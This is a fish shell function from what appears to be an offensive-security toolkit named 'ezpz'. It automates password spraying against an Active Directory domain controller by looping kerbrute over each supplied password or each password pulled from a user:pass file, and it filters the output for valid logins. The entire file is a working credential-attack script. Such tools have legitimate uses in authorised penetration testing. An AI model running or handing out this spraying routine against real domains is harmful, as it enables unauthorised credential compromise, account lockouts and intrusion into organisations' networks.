function _ezpz_credspray
    source $EZPZ_HOME/functions/_ezpz_colors.fish

    # ASCII art banner
    echo ''
    echo '                    |'(set_color magenta --bold)'   __|  _ \ _ \    \ \ \  / '(set_color normal)
    echo '   _|   _| -_)   _` |'(set_color magenta --bold)' \__ \  __/   /   _ \ \  /  '(set_color normal)
    echo ' \__| _| \___| \__,_|'(set_color magenta --bold)' ____/ _|  _|_\ _/  _\ _|  '(set_color normal)
    echo ''
    
    # Usage message
    set usage "
Usage: ezpz credspray -t <target> -u <usersfile> [-p <password>] [-c <credsfile>] -d <domain>
  Password spraying using kerbrute against Active Directory.

  -t, --target     Target IP or hostname (required)
  -u, --usersfile  File with usernames (one per line) (required)
  -p, --password   Password to spray (string or file with passwords)
  -c, --credsfile  File with user:pass credentials (alternative to -p)
  -d, --domain     Domain name (required)
"

    # Parse arguments
    argparse 't/target=' 'u/usersfile=' 'p/password=' 'c/credsfile=' 'd/domain=' 'h/help' -- $argv
    or begin
        ezpz_error "Failed to parse arguments."
        echo $usage
        return 1
    end

    if set -q _flag_help
        echo $usage
        return 1
    end

    # Validate required arguments
    if not set -q _flag_target
        ezpz_error "Missing target."
        echo $usage
        return 1
    end

    if not set -q _flag_usersfile
        ezpz_error "Missing usersfile."
        echo $usage
        return 1
    end

    if not set -q _flag_domain
        ezpz_error "Missing domain."
        echo $usage
        return 1
    end

    if not set -q _flag_password; and not set -q _flag_credsfile
        ezpz_error "Must specify either -p (password) or -c (credsfile)."
        echo $usage
        return 1
    end

    if set -q _flag_password; and set -q _flag_credsfile
        ezpz_error "Cannot specify both -p and -c options."
        echo $usage
        return 1
    end

    # Check for kerbrute
    if not command -v kerbrute >/dev/null 2>&1
        ezpz_error "Required tool not found: kerbrute"
        return 1
    end

    # Validate usersfile
    if not test -f $_flag_usersfile
        ezpz_error "Usersfile '$_flag_usersfile' not found."
        return 1
    end

    set -l passwords

    # Extract passwords from options
    if set -q _flag_password
        # Check if -p is a file or a string
        if test -f $_flag_password
            # Read passwords from file
            while read -l line
                set line (string trim -- $line)
                test -z "$line" && continue
                set -a passwords $line
            end < $_flag_password
        else
            # Single password string
            set passwords $_flag_password
        end
    else if set -q _flag_credsfile
        # Extract passwords from user:pass file
        if not test -f $_flag_credsfile
            ezpz_error "Credsfile '$_flag_credsfile' not found."
            return 1
        end
        
        while read -l line
            set line (string trim -- $line)
            test -z "$line" && continue
            
            set -l cred_parts (string split : $line)
            if test (count $cred_parts) -ge 2
                set -l password (string join : $cred_parts[2..-1])
                if not contains $password $passwords
                    set -a passwords $password
                end
            end
        end < $_flag_credsfile
    end

    if test (count $passwords) -eq 0
        ezpz_error "No passwords found to spray."
        return 1
    end

    ezpz_header "Starting password spray against $_flag_target"
    ezpz_cmd "kerbrute passwordspray --dc $_flag_target -d $_flag_domain $_flag_usersfile <PASSWORD>"
    ezpz_info "Passwords to test: "(count $passwords)

    # Run kerbrute for each password
    for password in $passwords
        ezpz_info "Testing password: $password"
        kerbrute passwordspray --dc $_flag_target -d $_flag_domain $_flag_usersfile $password | grep -oE "VALID LOGIN.*"
    end

    ezpz_success "Password spray completed."
end